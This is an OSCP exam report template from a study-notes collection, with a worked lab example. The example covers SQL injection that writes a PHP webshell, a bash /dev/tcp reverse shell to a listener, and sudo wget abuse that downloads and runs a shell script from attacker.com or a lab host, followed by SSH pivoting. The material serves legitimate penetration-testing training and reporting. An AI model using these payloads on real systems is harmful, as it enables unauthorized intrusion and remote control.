---
tags: [oscp, exam, report, template]
aliases: [OSCP Report, Submission Template]
category: Exam-Strategy
difficulty: ★★★☆☆
last-updated: 2025-04-30
---

# 📋 OSCP Exam Report Template (Professional Format)

> [!info] Report = 20 Points
> Your report MUST be perfect. Weak documentation = point loss.

---

## 📄 Report Structure (What Offensive Security Expects)

```
OSCP Penetration Test Report
Submitted by: [Your Name]
Exam Date: [Date]
Total Score: [X]/100 points
```

---

## 🎯 Machine 1: [Machine Name] (Port: X.X.X.X)

### Executive Summary
Brief overview of the machine and vulnerability exploited.

```
Machine Name: [Target Machine]
IP Address: 10.10.10.XX
Difficulty: [Easy/Medium/Hard]
Points: [25 points]
Status: ✅ ROOTED

Overview:
This machine was vulnerable to [specific vulnerability type]. 
Through systematic enumeration and exploitation, I was able to 
gain initial access as [user] and subsequently escalate 
privileges to [root/system], capturing the proof flag.
```

### Enumeration Phase

**Nmap Results:**
```bash
$ nmap -sS -p- -sV -sC -T4 10.10.10.XX

# Key findings:
- Port 22 (SSH): OpenSSH 7.4
- Port 80 (HTTP): Apache 2.4.6
- Port 445 (SMB): Samba 4.7.1
```

**Service-Specific Enumeration:**

**HTTP Enumeration (Port 80):**
```bash
$ nikto -h http://10.10.10.XX

# Interesting findings:
- Vulnerable plugin detected
- Sensitive files accessible
```

**SMB Enumeration (Port 445):**
```bash
$ enum4linux -a 10.10.10.XX

# Results:
- Share: [share_name] is readable without auth
- Users enumerated: [user1, user2]
```

### Vulnerability Analysis

**CVE Identified:** CVE-YYYY-XXXXX  
**Vulnerability Type:** [SQL Injection / Command Injection / RCE]  
**Severity:** Critical  

**Why This Vector Chosen:**
1. Direct RCE available
2. No authentication required
3. Well-known exploitable pattern

### Exploitation

**Attack Chain:**
```
1. Identify vulnerable parameter: [parameter_name]
2. Test for injection: [test_payload]
3. Craft exploit: [exploit_description]
4. Execute and gain shell
```

**Step-by-Step Exploitation:**

**Step 1: Identify Vulnerability**
```bash
$ curl -v "http://10.10.10.XX/search.php?q=test'OR'1'='1"

Response shows SQL error, confirming SQLi vulnerability
```

**[SCREENSHOT 1: SQLi Error Message]**

**Step 2: Extract Data**
```bash
$ sqlmap -u "http://10.10.10.XX/search.php?q=1" --dbs --batch

[+] Extracted databases: users, products, admin
```

**[SCREENSHOT 2: SQLMap Output]**

**Step 3: Gain RCE**
```bash
# Using UNION SELECT to write webshell
$ curl "http://10.10.10.XX/upload.php?id=1' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"

# Shell accessible at:
$ curl "http://10.10.10.XX/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**[SCREENSHOT 3: Shell Execution - whoami]**

**Step 4: Reverse Shell**
```bash
# Listener:
$ nc -lvnp 4444

# Payload:
$ curl "http://10.10.10.XX/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/4444%200%3E%261"

# Connection established as www-data
```

**[SCREENSHOT 4: Initial Shell Connected]**

---

### Post-Exploitation & Privilege Escalation

**System Information:**
```bash
$ uname -a
Linux [hostname] 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 02:35:27 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
```

**User Enumeration:**
```bash
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
Matching Defaults entries for www-data on [hostname]:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on [hostname]:
    (ALL) NOPASSWD: /usr/bin/wget
```

**[SCREENSHOT 5: sudo -l Output]**

**Privilege Escalation Vector:**

The user `www-data` can run `/usr/bin/wget` with NOPASSWD. This can be exploited to:

```bash
# Method: wget with output redirection
$ sudo wget http://10.10.10.10/malicious_file -O /root/.ssh/authorized_keys

# Or escalate to root shell
$ sudo /usr/bin/wget http://attacker.com/reverse_shell -O /tmp/shell.sh && sudo bash /tmp/shell.sh
```

**Exploitation:**
```bash
# Create reverse shell
$ echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /tmp/shell.sh

# Setup listener
$ nc -lvnp 4444

# Execute via sudo wget
$ sudo /usr/bin/wget http://10.10.10.10:8000/shell.sh -O /tmp/root_shell.sh && sudo bash /tmp/root_shell.sh

# Connection received as root
```

**[SCREENSHOT 6: Root Shell Connected]**

---

### Proof of Compromise

**Local Flag Capture:**
```bash
$ cat /root/proof.txt
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**[SCREENSHOT 7: /root/proof.txt]**

**System Information (Root):**
```bash
root@[hostname]:~$ whoami
root

root@[hostname]:~$ hostname
[hostname]

root@[hostname]:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

**[SCREENSHOT 8: Root Verification]**

---

### Timeline & Tools Used

| Phase | Time | Tool/Command |
|-------|------|--------------|
| Enumeration | 45 min | nmap, nikto, enum4linux |
| Exploitation | 30 min | sqlmap, curl |
| Post-Exploit | 15 min | linPEAS, manual enum |
| Privilege Escalation | 20 min | GTFOBins analysis, sudo |
| **Total** | **1h 50m** | |

**Tools Used:**
- nmap (network scanning)
- nikto (web scanning)
- enum4linux (SMB enumeration)
- sqlmap (SQLi automation)
- curl (manual testing)
- linPEAS (privesc enumeration)

---

## 🎯 Machine 2: [Machine Name] (Port: X.X.X.X)

**[REPEAT SAME STRUCTURE FOR MACHINE 2]**

---

## 🎯 Machine 3: [Machine Name] (Port: X.X.X.X)

**[REPEAT SAME STRUCTURE FOR MACHINE 3]**

---

## 🌐 Network Machine Compromise

**Objective:** Compromise the network by gaining access to multiple systems and pivoting to domain controller.

**Network Diagram:**
```
Internet
    ↓
10.10.10.100 (Webserver - Compromised First)
    ↓ (Pivoting)
172.16.0.0/24 (Internal Network)
    ├─ 172.16.0.50 (DB Server)
    ├─ 172.16.0.100 (File Server)
    └─ 172.16.0.1 (Domain Controller)
```

### Initial Compromise: 10.10.10.100

**[Same format as machines above]**

### Lateral Movement: Pivoting to 172.16.0.0/24

```bash
# Setup SOCKS proxy through compromised webserver
$ ssh -D 1080 user@10.10.10.100

# Scan internal network through proxy
$ proxychains nmap -sV 172.16.0.0/24

# Discover internal services
```

### Compromise: 172.16.0.50 (Database Server)

**[Exploitation chain]**

### Compromise: 172.16.0.1 (Domain Controller)

**[Final domain administrator compromise]**

**Domain Admin Proof:**
```bash
$ whoami
DOMAIN\Administrator

$ type C:\Users\Administrator\Desktop\proof.txt
[proof flag content]
```

---

## 📊 Summary Table

| Machine | Status | Points | Time | Difficulty |
|---------|--------|--------|------|-----------|
| Machine 1 | ✅ Rooted | 25 | 1h 50m | Easy |
| Machine 2 | ✅ Rooted | 25 | 2h 15m | Medium |
| Machine 3 | ✅ Rooted | 25 | 3h 40m | Hard |
| Network | ✅ Rooted | 25 | 6h 20m | Complex |
| **TOTAL** | **✅ PASS** | **100** | **14h 05m** | |

---

## 🎓 Methodology Reflection

### What Worked Well

1. ✅ **Systematic Enumeration** - Found all services before exploitation
2. ✅ **Documentation** - Screenshots taken throughout
3. ✅ **Privilege Escalation** - Identified easy wins (sudo abuse)
4. ✅ **Pivoting Strategy** - Clean network movement
5. ✅ **Time Management** - Completed under time limit

### Lessons Learned

1. Always spend 50% time on enumeration
2. Screenshot immediately after success
3. Post-exploitation enum reveals privesc vectors
4. Automated tools (linPEAS) save hours
5. Document attack chain clearly

---

## 📋 Submission Checklist

- [ ] All 3 machines rooted with proof
- [ ] Network machine compromised
- [ ] Minimum 70 points achieved
- [ ] All screenshots included
- [ ] Report properly formatted
- [ ] Timeline for each machine documented
- [ ] Tools used documented
- [ ] Methodology explained clearly
- [ ] Spelling & grammar checked
- [ ] Report submitted within deadline

---

**Related Notes:**
- [[08-Exam-Strategy/Common-OSCP-Mistakes|❌ Common Mistakes]]
- [[09-Exam-Day/Exam-Day-Checklist|✅ Exam Day Checklist]]

---
